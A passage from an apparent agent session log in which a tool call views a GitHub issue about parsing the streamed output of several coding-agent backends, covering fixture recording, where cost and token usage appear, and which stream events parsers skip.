blanks these and keeps the event shapes. `record.sh` applies it and replaces the home-directory name. Any live test that records fixtures (#17 and the per-backend live tests) must use the same filter.\n\n### Cost and usage\n\n- **claude:** `total_cost_usd` on the result line.\n- **cursor:** the result line has `usage` with `inputTokens`, `outputTokens`, `cacheReadTokens` and `cacheWriteTokens`, and no cost.\n- **pi:** `usage.cost` appears on messages. The `agent_end` last-message cost (`$0.00016` in `pi/tool-calls-fix`) looks per-message. #16 should verify whether the run total needs summing over `message_end` events.\n\n### Stream noise the parsers must skip\n\n- **claude:** `system/hook_started`, `system/hook_response` (4 of them from user hooks), `system/commands_changed` and `rate_limit_event` arrive before the assistant turn.\n- **pi:** `entry_appended` and `turn_*`, and a final `agent_settled` after `agent_end`.\n- **cursor:** `thinking/delta` and `thinking/completed`.\n\n--\n","localExecutionTimeMs":1341},"isBackground":false},"description":"View GitHub issue #4 with comments"},"hookAdditionalContexts":[],"toolCallId":"tool_eb875959-7d27-439a-8b4e-682d339e1b6","startedAtMs":"1790842905354","completedAtMs":"1790842907455"},"model_call_id":"1980f2fa-bcff-4397-b8a1-23601c4723d6-0-8565","session_id":"36627d89-4873-4238-8376-e9782bc73a39","timestamp_ms":1790842907383}
